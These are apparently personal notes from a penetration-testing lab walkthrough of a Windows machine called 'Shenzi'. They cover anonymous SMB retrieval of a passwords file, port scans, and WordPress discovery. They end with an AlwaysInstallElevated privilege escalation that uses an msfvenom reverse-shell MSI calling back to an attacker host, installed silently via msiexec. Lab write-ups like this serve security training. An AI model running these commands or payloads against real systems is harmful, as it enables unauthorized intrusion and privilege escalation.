### autorecon get it, hooray
### smbget
```bash
smbget -R smb://$IP/Shenzi/passwords.txt -U=anonymous%anonymous
smbget -R smb://$IP/Shenzi/readme_en.txt -U=anonymous%anonymous
```

### rust scan
```bash
docker run -it --rm --name rustscan rustscan/rustscan:1.10.0 $IP
```

PORT      STATE SERVICE      REASON
21/tcp    open  ftp          syn-ack
80/tcp    open  http         syn-ack
135/tcp   open  msrpc        syn-ack
139/tcp   open  netbios-ssn  syn-ack
443/tcp   open  https        syn-ack
445/tcp   open  microsoft-ds syn-ack
3306/tcp  open  mysql        syn-ack
5040/tcp  open  unknown      syn-ack
7680/tcp  open  pando-pub    syn-ack
49664/tcp open  unknown      syn-ack
49665/tcp open  unknown      syn-ack
49666/tcp open  unknown      syn-ack
49667/tcp open  unknown      syn-ack
49668/tcp open  unknown      syn-ack
49669/tcp open  unknown      syn-ack

### nmap
```bash
sudo nmap -sC -sV -A -p5040,7680 -v $IP
```

### Enum for wordpress
More than likely, the referenced Wordpress site is being hosted on this machine. Common wordlist attacks against the web server fail to locate the Wordpress directory. However, since the share name is shenzi, let's try that. If we navigate to http://192.168.65.55/shenzi, we are indeed presented with a Wordpress site.

### Checking AlwaysInstallElevated (HTB Academy Miscellaneous Techniques)
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated

Winpeas found it too. So verify it.


C:\Users\shenzi>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1


C:\Users\shenzi>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1

### Generate payload
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.59 LPORT=5040 -f msi > alvin.msi
```

### MSI package Installation/Executing
```
msiexec /quiet /qn /i C:\Users\shenzi\alvin.msi /norestart
```